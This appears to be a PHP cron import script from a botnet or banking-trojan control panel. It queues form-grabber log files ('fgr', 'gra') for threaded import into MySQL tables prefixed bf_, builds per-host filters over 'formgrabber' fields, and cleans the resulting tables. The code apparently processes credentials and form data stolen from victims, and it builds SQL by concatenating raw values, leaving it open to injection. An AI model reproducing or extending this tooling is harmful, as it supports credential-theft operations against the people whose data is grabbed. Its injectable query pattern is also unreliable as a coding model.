#!/usr/bin/env php
<?php
error_reporting(-1);

function real_path($p){
	return str_replace('//', '/', str_replace('\\', '/', realpath($p)) . '/');
}

$dir = array();
$dir['script'] = pathinfo(__FILE__, PATHINFO_DIRNAME);
$dir['site'] = real_path($dir['script'] . '/../');
$dir['logs'] = real_path($dir['site'] . '/logs/');
$dir['u']['5'] = real_path($dir['logs'] . '/unnecessary/fgr/');
$dir['u']['6'] = real_path($dir['logs'] . '/unnecessary/gra/');
$dir['s']['5'] = real_path($dir['logs'] . '/save_logs/fgr/');
$dir['s']['6'] = real_path($dir['logs'] . '/save_logs/gra/');
file_put_contents($dir['site'] . 'cache/dirs_import.json', json_encode($dir));

include_once($dir['site'] . 'includes/config.php');
require_once($dir['site'] . 'classes/mysqli.class.lite.php');
$mysqli = new mysqli_db();

$mysqli->connect($cfg_db['host'], $cfg_db['user'], $cfg_db['pass'], $cfg_db['db']);
$mysqli->settings["ping"] = true;

unset($cfg_db);
if(count($mysqli->errors) > 0){
	error_log('DB_ERROR: ' . print_r($mysqli->errors, true),4);
	exit;
}

require_once($dir['site'] . 'classes/threads.class.php');
$thread = new threads(&$mysqli);

$thread->settings['mp'] = '25';
$thread->settings["uniq"] = basename(__FILE__);
$thread->settings["file_proc"] = $dir['site'] . 'crons/import_file.php';
$thread->settings["error_file"] = $dir['site'] . 'cache/error_import.txt';
$thread->settings["pid_file"] = $dir['site'] . 'cache/pid_import.txt';
$thread->settings["user_func"] = 'user_threads';
$thread->settings["exit_script"] = 'exit_script';
$thread->settings["memory_limit"] = '512M';

$thread->clear();
$thread->set_pid();

$filters = array();

function load_task($row){
	global $mysqli, $thread;

	if(strpos($row->file, '/') === 0) $row->file = ltrim($row->file, '/');

	if(empty($row->post_id)){
		$mysqli->query("INSERT INTO bf_threads (file, type, size, script) VALUES ('".$row->file."', '".$row->type."', '".$row->size."', '".$thread->settings["uniq"]."')");
	}else{
		$mysqli->query("INSERT INTO bf_threads (file, type, size, post_id, script) VALUES ('".$row->file."', '".$row->type."', '".$row->size."', '".$row->post_id."', '".$thread->settings["uniq"]."')");
	}
}

function load_unnecessary($row){
	global $mysqli, $thread;
	if(!empty($row->host)) $mysqli->query("INSERT INTO bf_threads (file, type, unnecessary, script) VALUES ('".$row->host."', '".$row->type."', '".$row->host."', '".$thread->settings["uniq"]."')");
}

function load_filters($row){
	global $filters;
	$row = get_object_vars($row);
	$row['fields'] = json_decode(base64_decode($row['fields']), true);
	if(strpos($row['host'], ',') != false){
		$hosts = explode(',', $row['host']);
		if(count($hosts) > 0){
			foreach($hosts as $host){
				$row['host'] = $host;
				$filters[$row['host']] = $row;
			}
		}
	}else{
		$filters[$row['host']] = $row;
	}
}

function user_threads(){
	global $mysqli, $dir, $filters;

	$mysqli->query('SELECT id, fields, host, save_log FROM bf_filters WHERE host IS NOT NULL', false, 'load_filters');
	file_put_contents($dir['site'] . '/cache/filters.json', json_encode($filters));
	
	$mysqli->query('SELECT file, type, size, post_id FROM bf_files WHERE ((type = \'5\') OR (type = \'6\') OR (type = \'7\')) AND (status = \'1\') AND (import = \'0\') ORDER by size ASC', null, 'load_task');



	$mysqli->query('SELECT b.* FROM bf_filters a, bf_unnecessary b WHERE NOT isNULL(a.host) AND (a.host NOT LIKE \'%,%\') AND (b.host = a.host)', null, 'load_unnecessary');

	$ufs = $mysqli->query('SELECT host FROM bf_filters WHERE NOT isNULL(host) AND (host LIKE \'%,%\')', null, null, false);
	if(count($ufs) > 0){
		foreach($ufs as $u){
			$x = '';
			$y = explode(',', $u->host);
			if(count($y) > 0){
				foreach($y as $s){
					$x .= '(host = \''.$s.'\') OR ';
				}

				$mysqli->query('SELECT * FROM bf_unnecessary WHERE ' . preg_replace('~ OR $~', '', $x), null, 'load_unnecessary');
			}
		}
	}
	unset($ufs);
}

function start_index($row){
	global $mysqli;
	$mysqli->query('INSERT IGNORE INTO bf_unnecessary (`host`, `type`) SELECT DISTINCT `host`, `type` FROM `adm_unnecessary`.`'.$row->Tables_in_adm_unnecessary.'`');
}

function exit_script(){
	global $mysqli, $filters, $dir;
	
	$stdl = array();
	foreach($filters as $item){
		//if(@$stdl[$item['id']] != true){
		if(isset($stdl[$item['id']])){
			$stdl[$item['id']] = true;
			$where = '';
			foreach($item['fields']['formgrabber'] as $key => $item_f){
				$where .= '(v'.$key.' = \'\') OR ';
			}
			file_put_contents($dir['site'] . 'del_test_sql.txt', 'delete from bf_filter_'.$item['id'].' where ' . rtrim($where, ' OR ') . "\r\n", FILE_APPEND);
			$mysqli->query('delete from bf_filter_'.$item['id'].' where ' . rtrim($where, ' OR '));
		}
	}
	
	$mysqli->query('SHOW TABLES FROM adm_unnecessary', null, 'start_index');
	
	/*
	global $dir, $mysqli;
	foreach(glob($dir['site'] . 'cache/imports/*.txt') as $f){
		$zid = str_replace('.txt', '', basename($f));

		if($zid == 'unnecessary'){
			$zid =  'bf_unnecessary';
		}elseif($zid == 'save_ilog'){
			$zid =  'bf_save_ilog';
		}else{
			$zid =  'bf_filter_'.$zid;
		}

		$mysqli->query('LOAD DATA LOCAL INFILE \'' . $f . '\' INTO TABLE '.$zid.' FIELDS TERMINATED BY \'[|]\' LINES TERMINATED BY \'[~]\'');

		unlink($f);
	}
	*/
}

user_threads();

$thread->start();

//exit_script();

?>